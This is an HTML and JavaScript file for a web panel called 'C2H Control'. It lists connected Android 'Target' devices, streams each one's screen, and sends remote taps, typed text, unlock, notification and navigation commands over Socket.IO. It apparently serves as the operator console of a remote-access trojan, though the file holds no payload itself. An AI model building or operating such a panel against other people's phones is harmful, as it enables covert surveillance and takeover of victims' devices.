<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>C2H Ultimate Pro Panel</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #080808; font-family: 'Inter', sans-serif; color: white; }
        .hidden { display: none !important; }
        
        /* Device List */
        #device-list-view { height: 100vh; display: flex; flex-direction: column; padding: 20px; background: radial-gradient(circle at top, #1e293b, #050505); }
        .device-card { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(10px); border: 1px solid #1e293b; padding: 18px; border-radius: 20px; margin-bottom: 12px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: space-between; }
        .device-card:active { transform: scale(0.96); background: rgba(59, 130, 246, 0.2); border-color: #3b82f6; }
        
        /* Control Panel Layout */
        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100vw; }
        .main-content { display: flex; flex: 1; overflow: hidden; }
        
        /* Sidebar Controls */
        .side-controls { width: 75px; background: #000; display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 15px 0; border-right: 1px solid #111; z-index: 50; overflow-y: auto; }
        .side-btn { width: 50px; height: 50px; border-radius: 15px; background: #111; display: flex; align-items: center; justify-content: center; transition: all 0.2s; font-size: 20px; color: #666; border: 1px solid #222; }
        .side-btn:active { transform: scale(0.85); background: #3b82f6; color: white; border-color: #3b82f6; }
        .btn-vol-up { color: #10b981; }
        .btn-vol-down { color: #ef4444; }
        .btn-scroll { color: #3b82f6; }

        /* Center Screen View */
        .screen-view { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; padding: 10px; }
        .phone-frame { position: relative; max-width: 100%; max-height: 100%; display: flex; flex-direction: column; align-items: center; border: 8px solid #1a1a1a; border-radius: 35px; padding: 10px; background: #000; box-shadow: 0 0 50px rgba(0,0,0,0.8); }
        #live-screen { max-width: 100%; max-height: calc(100vh - 200px); object-fit: contain; border-radius: 15px; cursor: crosshair; }
        
        /* Android Nav Bar */
        .android-nav { width: 100%; height: 60px; background: #000; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #111; margin-top: 8px; border-radius: 0 0 25px 25px; }
        .nav-icon { color: #444; font-size: 22px; padding: 15px 25px; transition: 0.2s; }
        .nav-icon:active { color: #3b82f6; transform: scale(1.3); }

        /* Bottom Controls (Typing) */
        .bottom-bar { height: 90px; background: #000; display: flex; align-items: center; padding: 0 20px; gap: 12px; border-top: 1px solid #111; }
        .type-input { flex: 1; background: #111; border: 1px solid #222; border-radius: 12px; padding: 12px 18px; color: white; outline: none; font-size: 15px; }
        .type-input:focus { border-color: #3b82f6; }
        .send-btn { background: #3b82f6; color: white; width: 55px; height: 45px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; }

        /* Floating Badges */
        .top-info { position: absolute; top: 20px; left: 95px; right: 20px; display: flex; justify-content: space-between; pointer-events: none; z-index: 40; }
        .badge { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); padding: 6px 14px; border-radius: 20px; font-size: 13px; border: 1px solid #222; display: flex; align-items: center; gap: 8px; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 10px #10b981; }
    </style>
</head>
<body>

    <!-- DEVICE LIST -->
    <div id="device-list-view">
        <h1 class="text-3xl font-bold mb-10 flex items-center gap-4 text-white/90">
            <i class="fas fa-microchip text-blue-500"></i> C2H Control
        </h1>
        <div id="devices-container" class="flex-1 overflow-y-auto pr-2">
            <p class="text-slate-500 text-center mt-20">Scanning network...</p>
        </div>
    </div>

    <!-- CONTROL PANEL -->
    <div id="control-view" class="app-container hidden">
        <div class="main-content">
            <div class="side-controls">
                <button onclick="goBackToList()" class="side-btn text-yellow-500"><i class="fas fa-list-ul"></i></button>
                <div class="w-10 h-px bg-zinc-900 my-1"></div>
                <button onclick="sendCommand('unlock_device')" class="side-btn text-blue-400"><i class="fas fa-power-off"></i></button>
                <button onclick="sendCommand('notifications')" class="side-btn"><i class="fas fa-bell"></i></button>
                <button onclick="sendCommand('quick_settings')" class="side-btn"><i class="fas fa-cog"></i></button>
                <div class="w-10 h-px bg-zinc-900 my-1"></div>
                <!-- Scroll Tools (All Directions) -->
                <button onclick="sendScroll('up')" class="side-btn btn-scroll"><i class="fas fa-arrow-up"></i></button>
                <button onclick="sendScroll('down')" class="side-btn btn-scroll"><i class="fas fa-arrow-down"></i></button>
                <button onclick="sendScroll('left')" class="side-btn btn-scroll"><i class="fas fa-arrow-left"></i></button>
                <button onclick="sendScroll('right')" class="side-btn btn-scroll"><i class="fas fa-arrow-right"></i></button>
                <div class="w-10 h-px bg-zinc-900 my-1"></div>
                <!-- Volume Controls (Plus/Minus) -->
                <button onclick="sendCommand('volume_up')" class="side-btn btn-vol-up"><i class="fas fa-plus"></i></button>
                <button onclick="sendCommand('volume_down')" class="side-btn btn-vol-down"><i class="fas fa-minus"></i></button>
            </div>

            <div class="screen-view">
                <div class="top-info">
                    <div class="badge"><div class="status-dot"></div> <span id="info-model">Target</span></div>
                    <div class="badge"><i class="fas fa-battery-half text-green-500"></i> <span id="info-battery">--%</span></div>
                </div>

                <div class="phone-frame">
                    <img id="live-screen" src="https://via.placeholder.com/1080x1920/000?text=LOAD..." alt="Screen">
                    
                    <div class="android-nav">
                        <button onclick="sendGlobal('back')" class="nav-icon"><i class="fas fa-chevron-left"></i></button>
                        <button onclick="sendGlobal('home')" class="nav-icon"><i class="far fa-circle"></i></button>
                        <button onclick="sendGlobal('recents')" class="nav-icon"><i class="far fa-square"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <div class="bottom-bar">
            <input type="text" id="type-box" class="type-input" placeholder="Type text to phone...">
            <button onclick="handleType()" class="send-btn"><i class="fas fa-paper-plane"></i></button>
        </div>
    </div>

    <script>
        const socket = io();
        const screenImg = document.getElementById('live-screen');
        const typeBox = document.getElementById('type-box');
        let currentTargetId = null;
        let screenW = 1080, screenH = 1920;

        socket.on('devices_list', (devices) => {
            const container = document.getElementById('devices-container');
            if (devices.length === 0) {
                container.innerHTML = '<div class="text-center mt-20 text-slate-700">No active sessions.</div>';
                return;
            }
            container.innerHTML = devices.map(dev => `
                <div class="device-card" onclick="selectDevice('${dev.deviceId}', '${dev.deviceName}')">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-zinc-900 flex items-center justify-center border border-zinc-800">
                            <i class="fas fa-mobile-alt text-2xl text-blue-500"></i>
                        </div>
                        <div>
                            <div class="font-bold text-lg text-white/90">${dev.deviceName}</div>
                            <div class="text-xs text-zinc-500 font-mono">${dev.deviceId}</div>
                        </div>
                    </div>
                    <div class="text-right">
                        <span class="text-[10px] text-green-500 font-bold uppercase tracking-tighter">● Online</span>
                        <div class="text-sm mt-1 text-zinc-400 font-bold">${dev.battery || '--'}%</div>
                    </div>
                </div>
            `).join('');
        });

        function selectDevice(id, name) {
            currentTargetId = id;
            document.getElementById('info-model').innerText = name;
            document.getElementById('device-list-view').classList.add('hidden');
            document.getElementById('control-view').classList.remove('hidden');
            socket.emit('panel_command', { targetId: id, type: 'start_live_stream', data: {} });
        }

        function goBackToList() {
            document.getElementById('control-view').classList.add('hidden');
            document.getElementById('device-list-view').classList.remove('hidden');
            currentTargetId = null;
        }

        socket.on('live_screen_update', (data) => {
            if (data.deviceId === currentTargetId && data.liveImage) {
                screenImg.src = 'data:image/jpeg;base64,' + data.liveImage;
                if (data.screenWidth) screenW = data.screenWidth;
                if (data.screenHeight) screenH = data.screenHeight;
            }
        });

        socket.on('status_update', (data) => {
            if (data.deviceId === currentTargetId && data.battery) {
                document.getElementById('info-battery').innerText = `${data.battery}%`;
            }
        });

        screenImg.addEventListener('click', (e) => {
            if (!currentTargetId) return;
            const rect = screenImg.getBoundingClientRect();
            const x = Math.round(((e.clientX - rect.left) / rect.width) * screenW);
            const y = Math.round(((e.clientY - rect.top) / rect.height) * screenH);
            socket.emit('panel_command', { targetId: currentTargetId, type: 'touch_command', data: { x, y } });
        });

        function sendCommand(type) {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: type, data: {} });
        }

        function sendGlobal(action) {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'global_action', data: { action } });
        }

        function sendScroll(direction) {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'scroll_action', data: { direction } });
        }

        function handleType() {
            const text = typeBox.value;
            if (!text || !currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'type_text', data: { text } });
            typeBox.value = '';
        }

        typeBox.addEventListener('keypress', (e) => { if(e.key === 'Enter') handleType(); });
    </script>
</body>
</html>
